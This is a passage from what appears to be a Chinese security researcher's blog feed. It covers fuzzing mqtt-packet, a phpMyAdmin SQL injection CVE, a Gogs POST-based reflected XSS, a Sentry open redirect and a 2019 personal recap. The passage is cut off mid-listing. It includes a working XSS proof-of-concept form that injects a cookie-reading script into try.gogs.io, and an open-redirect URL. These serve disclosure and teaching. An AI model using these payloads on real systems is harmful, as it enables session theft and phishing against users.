</span></span><span class="line"><span class="cl">#56 NEW     cov: 749 corp: 7 exec/s: 1444 rss: 36.07 MB
</span></span><span class="line"><span class="cl">#63 NEW     cov: 773 corp: 8 exec/s: 1750 rss: 36.07 MB
</span></span><span class="line"><span class="cl">#108 NEW     cov: 775 corp: 9 exec/s: 1607 rss: 36.3 MB
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>NEW</code>表示发现了新的路径</p>
<p><code>cov</code>代表行数, <code>corp</code>代表的不同路径数 <code>exec/s</code>代表每秒执行的次数 <code>rss</code>代表内存占用</p>
<p>由于这个库代码量不大,预期上能产生崩溃最多几分钟,不然就不可能了. 模糊测试的效果和运行时间并不是线性的.</p>
<p>不过由于这次运行并未提供任何一个样本,指望模糊测试器能覆盖太多路径是不太现实的.</p>
<h5 id="覆盖率">覆盖率</h5>
<p>在终止运行后,jsfuzz将会产生一个覆盖率文件. 可以通过nyc生成覆盖率报告</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">npm i -D nyc 
</span></span><span class="line"><span class="cl">node_modules/.bin/nyc report --reporter<span class="o">=</span>html --exclude-node-modules<span class="o">=</span><span class="nb">false</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>输出路径在<code>couverage</code>目录,打开html文件后</p>
<p>页面如下,我们fuzz的包在<code>node_modules/mqtt-packet</code>, 可以看出覆盖率很低.点开后可以发现<code>parser.js</code>的覆盖率只有57%. 这是一个相当低的数值</p>
<p><img src="https://i.loli.net/2020/01/19/V4HfF8tNyPgw29E.png" alt="image_2020-01-19_15-37-35.png"></p>
<p>#####　生成一些样本</p>
<p>可以通过<code>mqtt.generate(obj)</code> 生成正确的mqtt格式, 尝试用包自带的生成例子就能得到一个样本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">mqtt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;mqtt-packet&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">cmd</span><span class="o">:</span> <span class="s1">&#39;publish&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">retain</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">qos</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">dup</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">length</span><span class="o">:</span> <span class="mi">10</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">topic</span><span class="o">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">payload</span><span class="o">:</span> <span class="s1">&#39;test&#39;</span> <span class="c1">// Can also be a Buffer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">protocolVersion</span><span class="o">:</span> <span class="mi">4</span> <span class="p">}</span> <span class="c1">// default is 4. Usually, opts is a connect packet
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">mqtt</span><span class="p">.</span><span class="nx">generate</span><span class="p">(</span><span class="nx">object</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 写入文件的方法 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="nx">mqtt</span><span class="p">.</span><span class="nx">generate</span><span class="p">(</span><span class="nx">object</span><span class="p">),</span>  <span class="s2">&#34;binary&#34;</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span> <span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>用mqtt-packet仓库说明里的mqtt object格式生成更多样本后得到了16个样本.</p>
<p><img src="https://i.loli.net/2020/01/19/rOdIE48WsP5Yh7w.png" alt="image_2020-01-19_15-51-21.png"></p>
<p>运行后</p>
<p><code>jsfuzz fuzz2.js test_corpus/ </code></p>
<p>可以看到路径数从50提高了67 并且在67个路径上爆出了一个错误</p>
<p><img src="https://i.loli.net/2020/01/19/zGkrldgUZiCOyA4.png" alt="image_2020-01-19_15-54-33.png"></p>
<p>文本版</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">RangeError [ERR_BUFFER_OUT_OF_BOUNDS]: Attempt to write outside buffer bounds
</span></span><span class="line"><span class="cl">    at boundsError (internal/buffer.js:70:11)
</span></span><span class="line"><span class="cl">    at Buffer.readUInt8 (internal/buffer.js:238:5)
</span></span><span class="line"><span class="cl">    at BufferList.&lt;computed&gt; [as readUInt8] (/home/bluebird/fuzz/jsfuzz/node_modules/bl/bl.js:1:33980)
</span></span><span class="line"><span class="cl">    at Parser._parseByte (/home/bluebird/fuzz/jsfuzz/node_modules/mqtt-packet/parser.js:1:71555)
</span></span><span class="line"><span class="cl">    at Parser._parseProperties (/home/bluebird/fuzz/jsfuzz/node_modules/mqtt-packet/parser.js:1:72858)
</span></span><span class="line"><span class="cl">    at Parser._parseConnect (/home/bluebird/fuzz/jsfuzz/node_modules/mqtt-packet/parser.js:1:55778)
</span></span><span class="line"><span class="cl">    at Parser._parsePayload (/home/bluebird/fuzz/jsfuzz/node_modules/mqtt-packet/parser.js:1:51576)
</span></span><span class="line"><span class="cl">    at Parser.parse (/home/bluebird/fuzz/jsfuzz/node_modules/mqtt-packet/parser.js:1:49930)
</span></span><span class="line"><span class="cl">    at Worker.fuzz [as fn] (/home/bluebird/fuzz/jsfuzz/fuzz2.js:1:1523)
</span></span><span class="line"><span class="cl">    at process.&lt;anonymous&gt; (/usr/local/lib/node_modules/jsfuzz/build/src/worker.js:63:30)
</span></span></code></pre></td></tr></table>
</div>
</div><p>一个尝试越界读导致的错误(nodjs会阻止越界读写buffer)</p>
<p>查看覆盖率的话 发现已经达到了85% 简单浏览就能发现未能覆盖到的都是需要解析器使用协议的版本为5 而不是例子里的4.</p>
<p><img src="https://i.loli.net/2020/01/19/QSChfLHVKOGBlYw.png" alt="image_2020-01-19_16-03-43.png"></p>
<h4 id="后言">后言</h4>
<p>在像nodejs这类现代语言,使用fuzz来测试module能发现的大多数只是bug,在检查了缓冲区越界读写后你没法利用它.能发现的安全漏洞常见是dos,用错误的输出导致内存占用过大或者崩溃.</p>
<p>但JavaScript的依赖管理导致依赖了太多的包,如果你能发现一个底层包的问题,你将能对大量使用它的包进行攻击.</p>
]]></content></item><item><title>第一个cve</title><link>https://blue-bird1.github.io/posts/first-cve/</link><pubDate>Mon, 23 Mar 2020 21:06:04 +0800</pubDate><guid>https://blue-bird1.github.io/posts/first-cve/</guid><description>第一个CVE 在今天获得了第一个有CVE编号的漏洞 CVE-2020-10804 . CVE只是一个漏洞数据库,只需要自己申请即可. 但国内会自己给小漏洞申请CVE很少,往往视</description><content type="html"><![CDATA[<h2 id="第一个cve">第一个CVE</h2>
<p>在今天获得了第一个有CVE编号的漏洞 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10804">CVE-2020-10804</a> .</p>
<p>CVE只是一个漏洞数据库,只需要自己申请即可. 但国内会自己给小漏洞申请CVE很少,往往视为一种水货CVE.这也是第一个不需要我自己申请CVE的漏洞.</p>
<p>有趣的是PHPMyadmin这个月修复的漏洞,包括这个漏洞里,三个漏洞撞了两个(指被两个或以上的人提交)</p>
<p>和我同时发现问题的是<a href="mailto:hoangnguyenatn@gmail.com">hoangn144_VCS</a> 大佬,他是在登录插件处发现的用户名注入.</p>
<h3 id="漏洞详情">漏洞详情</h3>
<p>这个漏洞很水,我从审计开始到发现这个问题用时没超过两个小时.只是在sql查询时直接拼接字符串.</p>
<p>phpmyadmin在编辑密码和权限对用户名转义不当 ,补丁很简单 就是加上转义了而已</p>
<p><img src="https://i.loli.net/2020/03/23/jXzR76hWMY1cFtQ.png" alt="image.png"></p>
<p>密码处补丁 复现也很简单 只需要在mysql5.6下编辑一个有单引号的用户名即可</p>
<h3 id="漏洞发现">漏洞发现</h3>
<p>首先我阅读了近几天被发现的漏洞 这个可以在<a href="https://www.phpmyadmin.net/security/">这里</a>找到.</p>
<p>发现大部分问题都只是简单的sql拼接 而且漏洞模式非常相似. 我在IDE下精心构造了几个正则表达式</p>
<p>由于时间比较久了 没记下 但是大概如下</p>
<p>第一个</p>
<p><code>$GLOBALS['dbi']-&gt;tryQuery(\$_[GET|POST][^)]*)</code> 寻找在查询函数中被直接引入的请求变量</p>
<p>实际上上面效果不佳 因为大部分sql语句都不在查询函数构造 而且这个没有过滤已经被转义过的变量</p>
<p>第二个</p>
<p><code>'.*?'+.\$_POST</code>  这个能找到简单的字符串拼接 但在复杂的函数调用中还是无能为力</p>
<p>最后我使用了两种方法结合 第一种跟踪<code>$_GET|$_POST</code>   第二种根据开发的变量命名习惯 将第二条修改为</p>
<p><code>$.*?query = \'.*?\'+.\$</code></p>
<p>成功在短时间内发现了问题</p>
<h3 id="评价">评价</h3>
<p>在知名项目中 phpmyadmin应该属于最好挖 但漏洞影响很小的.在发现第一个时,我同时还有几个怀疑的注入,但毫无疑问那些也是接近于无的危害.</p>
<p>phpmyadmin只能使用你给的账号来查询,select注入是没什么意义的,无法提权.只有能导致高权限用户在进行某些操作时像<code>update</code> <code>alter</code>之类语句中注入或者xss才有意义,但利用难度也非常高</p>
<h3 id="漏洞时间线">漏洞时间线</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">2020.1.20 提交给phpmyadmin安全组
</span></span><span class="line"><span class="cl">2020.1.21 得到第一次回应
</span></span><span class="line"><span class="cl">2020.3.21 修复并发布新版本
</span></span><span class="line"><span class="cl">2020.3.22 CVE-2020-10804已分配
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Gogs post 反射型 Xss</title><link>https://blue-bird1.github.io/posts/gogs_post_xss/</link><pubDate>Tue, 28 Jan 2020 00:13:39 +0800</pubDate><guid>https://blue-bird1.github.io/posts/gogs_post_xss/</guid><description>通过form利用gogs的post型反射型xss 审计 在审计gogs代码时发现gogs的api允许渲染markdown.最初以为是无法利用的,</description><content type="html"><![CDATA[<h3 id="通过form利用gogs的post型反射型xss">通过form利用gogs的post型反射型xss</h3>
<h3 id="审计">审计</h3>
<p>在审计gogs代码时发现gogs的api允许渲染markdown.最初以为是无法利用的,但发现gogs这个api返回的content-type是html,并且没有csrf机制.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nf">Group</span><span class="p">(</span><span class="s">&#34;/v1&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Handle preflight OPTIONS request
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">m</span><span class="p">.</span><span class="nf">Options</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Miscellaneous
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">m</span><span class="p">.</span><span class="nf">Post</span><span class="p">(</span><span class="s">&#34;/markdown&#34;</span><span class="p">,</span> <span class="nf">bind</span><span class="p">(</span><span class="nx">api</span><span class="p">.</span><span class="nx">MarkdownOption</span><span class="p">{}),</span> <span class="nx">misc2</span><span class="p">.</span><span class="nx">Markdown</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">m</span><span class="p">.</span><span class="nf">Post</span><span class="p">(</span><span class="s">&#34;/markdown/raw&#34;</span><span class="p">,</span> <span class="nx">misc2</span><span class="p">.</span><span class="nx">MarkdownRaw</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但这个api仅仅允许post方法,不能通过常见的get方法来进行xss.</p>
<h3 id="构造poc">构造poc</h3>
<p>无法直接通过url 提交一个post请求,但可以通过form元素进行提交并直接重定向.</p>
<p>最简单的提交例子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">Form</span> <span class="na">action</span><span class="o">=</span><span class="s">url</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">hidden</span> <span class="na">name</span><span class="o">=</span><span class="s">xxx</span> <span class="na">value</span><span class="o">=</span><span class="s">xxx</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="nb">document</span><span class="p">.</span><span class="nx">Form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这和csrf都是通过伪造请求来利用 只是csrf是通过xhr请求 这是通过form来得到需要的重定向.</p>
<p>最后的poc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"> <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit()&#34;</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://try.gogs.io/api/v1/markdown&#34;</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;text&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#34;</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>漏洞时间线</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1.25 发送提交漏洞邮件
</span></span><span class="line"><span class="cl">1.25 一小时后得到第一次回应
</span></span><span class="line"><span class="cl">1.27 漏洞修复
</span></span></code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>Sentry 过时依赖导致的安全问题</title><link>https://blue-bird1.github.io/posts/sentry-bug/</link><pubDate>Wed, 22 Jan 2020 02:29:26 +0800</pubDate><guid>https://blue-bird1.github.io/posts/sentry-bug/</guid><description>Sentry因过时依赖导致的安全问题 前言 这次挖的其实没啥技术含量 但是从依赖挖掘到漏洞还是比较少见的. 挖掘过程 下载源码后,发现src目录有so</description><content type="html"><![CDATA[<h3 id="sentry因过时依赖导致的安全问题">Sentry因过时依赖导致的安全问题</h3>
<h3 id="前言">前言</h3>
<p>这次挖的其实没啥技术含量 但是从依赖挖掘到漏洞还是比较少见的.</p>
<h3 id="挖掘过程">挖掘过程</h3>
<p>下载源码后,发现src目录有<code>social_auth</code>目录,并查看<code>views.py</code>(django的主要业务逻辑文件).</p>
<p>并注意到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">   <span class="c1"># Save any defined next value into session</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">REDIRECT_FIELD_NAME</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Check and sanitize a user-defined GET/POST next field value</span>
</span></span><span class="line"><span class="cl">        <span class="n">redirect</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">REDIRECT_FIELD_NAME</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># NOTE: django-sudo&#39;s `is_safe_url` is much better at catching bad</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># redirections to different domains than social_auth&#39;s</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># `sanitize_redirect` call.</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">is_safe_url</span><span class="p">(</span><span class="n">redirect</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">get_host</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">            <span class="n">redirect</span> <span class="o">=</span> <span class="n">DEFAULT_REDIRECT</span>
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="n">REDIRECT_FIELD_NAME</span><span class="p">]</span> <span class="o">=</span> <span class="n">redirect</span> <span class="ow">or</span> <span class="n">DEFAULT_REDIRECT</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>sentry使用了<code>django-sudo</code>来做url验证,搜索这个库.发现这个库的实际新代码提交是<code>2016</code>年的.</p>
<p>这意味着如果在近些年出现过bypass,这个库并未进行修复. 快速的进行了谷歌搜索.很快就发现<code>CVE-2017-7233</code> django的is_safe_url的绕过.</p>
<p>参考文章 <code>https://paper.seebug.org/274/#cve-2017-7233-django-is95safe95url-urlbypass</code></p>
<p>通过对调用的分析  选择了logout作为简单的poc<code>http://127.0.0.1:9000/auth/logout/?next=https:1029415385</code>.<code>  点击</code>sign out`将跳转到一个谷歌的ip</p>
<h3 id="漏洞时间线">漏洞时间线</h3>
<p><code>2019-12-24</code>: 漏洞提交</p>
<p><code>2019-1-14</code>: 问题已修复</p>
]]></content></item><item><title>2019 总结</title><link>https://blue-bird1.github.io/posts/2019-summary/</link><pubDate>Tue, 31 Dec 2019 01:07:17 +0800</pubDate><guid>https://blue-bird1.github.io/posts/2019-summary/</guid><description>## 2019年度总结 2019年度进度 ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100% 2019年要过完了, 博主今年又干了啥呢. 远行 基本没离开过家门 最远</description><content type="html"><![CDATA[<p>##　2019年度总结</p>
<p>2019年度进度</p>
<p>▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100%</p>
<p>2019年要过完了, 博主今年又干了啥呢.</p>
<h3 id="远行">远行</h3>
<p>基本没离开过家门　最远距离也就到县城和群内朋友家玩了一下</p>
<h3 id="购物">购物</h3>
<p>今年618换了台新电脑  <code>1t硬盘/32g内存/ryzen5</code>  , 我这大奶配置离群内大佬的三奶配置都有一段距离,不过不得不说amd真香</p>
<p>旧的手机不小心摔了 只好在咸鱼几百块买了台小米max 屏幕挺大的.</p>
<h3 id="写代码">写代码</h3>
<p><img src="https://i.loli.net/2019/12/31/zpihgUqFw4DuHYI.png" alt="2019-12-31 00-36-44 的屏幕截图.png"></p>
<p>中间半年全在摸鱼了 其他也没写出什么完整的项目.总体来说全年都在摸鱼了</p>
<h3 id="挖src">挖src</h3>
<p>今年第一次挖src, 挖了<code>bilibili</code>和<code>网易</code>.. 挖了十来个吧,都是低中危, 连一个严重级别的漏洞都没有..</p>
<p>网易src奖励其实不高 不过看在<code>积分&gt;10</code>就给发新年礼物的面子上 还是挖了几个xss/重定向. 等元旦结束就会发了</p>
<h3 id="代码审计">代码审计</h3>
<p>下半年(其实就是前一两月不摸鱼开始)审了不少php的cms. 大型中型小型的都看过,</p>
<p>小型非常好挖.. 挖到的没审到几十也有一打了, 不过并没有啥用.. 真正能换钱的就那几个</p>
<h3 id="读书">读书</h3>
<p>全年都在摸鱼, 看书不多 <a href="https://www.goodreads.com/user_challenges/15685317">读书列表</a>  都是些阅读难度不大的杂书</p>
<h3 id="番剧">番剧</h3>
<h4 id="1月番">1月番</h4>
<ul>
<li>
<p>笨拙之极的上野</p>
</li>
<li>
<p>天使降临到我身边！ //  我永远喜欢小学生.jpg</p>
</li>
</ul>
<h4 id="4月">4月</h4>
<ul>
<li>
<p><a href="https://zh.wikipedia.org/wiki/%E8%B3%A2%E6%83%A0%E5%B9%BC%E5%A6%BB%E4%BB%99%E7%8B%90%E5%B0%8F%E5%A7%90">贤惠幼妻仙狐小姐</a>  // 我也想要一个仙狐小姐</p>
</li>
<li>
<p><a href="https://zh.wikipedia.org/wiki/%E7%BA%8C%C2%B7%E7%B5%82%E7%89%A9%E8%AA%9E"> 续·终物语</a></p>
</li>
</ul>
<h4 id="7月">7月</h4>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E6%B1%97%E5%90%A7%EF%BC%81%E5%81%A5%E8%BA%AB%E5%B0%91%E5%A5%B3">流汗吧！健身少女</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%93%85%E9%95%B7%E6%8D%89%E5%BC%84%E4%BA%BA%E7%9A%84%E9%AB%98%E6%9C%A8%E5%90%8C%E5%AD%B8">擅长捉弄人的高木同学2</a> // 这糖甜到掉牙了</li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%A1%97%E8%A7%92%E9%AD%94%E6%97%8F">街角魔族</a></li>
</ul>
<h4 id="10月">10月</h4>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E9%80%99%E5%80%8B%E5%8B%87%E8%80%85%E6%98%8E%E6%98%8E%E8%B6%85TUEEE%E5%8D%BB%E9%81%8E%E5%BA%A6%E8%AC%B9%E6%85%8E">慎重勇者～这个勇者明明超TUEEE却过度谨慎～</a></li>
</ul>
<p>都是一些偏向搞笑/轻松的番剧</p>
<h3 id="博客更新">博客更新</h3>
<p>换了两次主题, 一共更新了18篇博客, 平均每月更新超过了一篇(很多么)   主题大部分都是计算机安全</p>
<h3 id="交际圈">交际圈</h3>
<p>qq群的朋友随着时间流逝在群里发言越来越少 , 一天也没几条发言.. 博主使用的社交平台也逐渐变成了tg.</p>
<p>也没什么资本认识啥大佬,总体来说只是正常的改变</p>
<h3 id="技术总结">技术总结</h3>
<p>虽说有所成果, 不过离大佬的距离也就一个宇宙那么大.. 所用的知识也没什么升级, 需要进一步升级.. 也没做什么值得一说的工作..</p>
<p>学到的只是一些技巧性的东西, 虽然在挖洞上效果显著,但是对整体技术没啥用</p>
<h3 id="明年展望">明年展望</h3>
<p>也不做什么计划,反正计划就是用来放弃的.. 希望明年学习方面能有所进步,读一些能带来进步的书&hellip; 同时能多做一些有价值的工作,而不是像挖洞/审计小cms这种带机械性的事..</p>
<p>写博客的话 能多写点不水的..</p>
]]></content></item><item><title>对骑士cms的一次弱加密漏洞挖掘</title><link>https://blue-bird1.github.io/posts/74cms-bug/</link><pubDate>Tue, 24 Dec 2019 12:10:30 +0800</pubDate><guid>https://blue-bird1.github.io/posts/74cms-bug/</guid><description>对某cms的一次弱加密漏洞挖掘 前言 之前在挖某cms漏洞, 由于是tp框架的老牌cms, 便不想机械性去看sql注入和xss之类的.开始探索这个c</description><content type="html"><![CDATA[<h3 id="对某cms的一次弱加密漏洞挖掘">对某cms的一次弱加密漏洞挖掘</h3>
<h4 id="前言">前言</h4>
<p>之前在挖某cms漏洞, 由于是tp框架的老牌cms, 便不想机械性去看sql注入和xss之类的.开始探索这个cms是否有一些有趣的代码</p>
<h4 id="对加密算法的探索">对加密算法的探索</h4>
<p>很快我就发现这个cms使用了以下这段加密代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
